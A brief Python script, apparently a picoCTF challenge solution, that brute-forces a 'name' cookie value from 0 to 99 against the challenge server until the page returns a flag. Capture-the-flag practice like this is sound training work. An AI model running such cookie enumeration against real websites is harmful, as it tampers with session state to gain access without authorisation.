import requests
import pprint as pp

url = "http://mercury.picoctf.net:29649/check"

s = requests.Session()
s.get(url)

for i in range(0, 100):
    cookie = {'name':str(i)}

    req = s.get(url, cookies=cookie)

    if "picoCTF{" in req.text:
        print(req.text)
        break
    else:
        print(f"Trying cookie: {i}")    


